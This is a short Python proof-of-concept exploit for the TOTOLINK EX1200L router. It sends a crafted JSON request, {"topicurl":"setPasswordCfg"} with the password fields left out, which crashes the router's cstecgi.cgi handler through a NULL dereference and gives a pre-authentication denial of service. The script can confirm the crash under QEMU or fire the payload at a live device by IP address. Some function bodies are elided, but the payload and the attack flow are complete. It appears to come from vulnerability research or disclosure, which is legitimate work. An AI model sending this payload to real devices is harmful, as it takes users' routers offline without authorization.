#!/usr/bin/env python3
"""
PoC: TOTOLINK EX1200L cstecgi.cgi — NULL dereference in setPasswordCfg handler

Sending {"topicurl":"setPasswordCfg"} without required password fields causes
strcoll() to be called with a NULL pointer → SIGSEGV (pre-auth DoS).

100% reproducible with direct QEMU execution.

Usage:
  python3 poc_ex1200l_setPasswordCfg.py [sysroot_path]
  # or against a live device:
  python3 poc_ex1200l_setPasswordCfg.py --live 192.168.0.1
"""
import os, sys, socket, subprocess

PAYLOAD = b'{"topicurl":"setPasswordCfg"}'
...
def poc_live(host: str, port: int = 80):
    ...
    if not resp:
        print("[!] No response — server may have crashed (DoS confirmed)")


def poc_qemu(sysroot: str):
    binary = os.path.join(sysroot, "www", "cgi-bin", "cstecgi.cgi")
    qemu   = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "..", "..", "..", "build", "qemu-mipsel")
    ...
    if p.returncode == -11:
        print("[+] SIGSEGV confirmed — NULL dereference in setPasswordCfg (strcoll)")
    else:
...
if __name__ == "__main__":
    if "--live" in sys.argv:
        ...
        poc_qemu(os.path.abspath(sysroot))
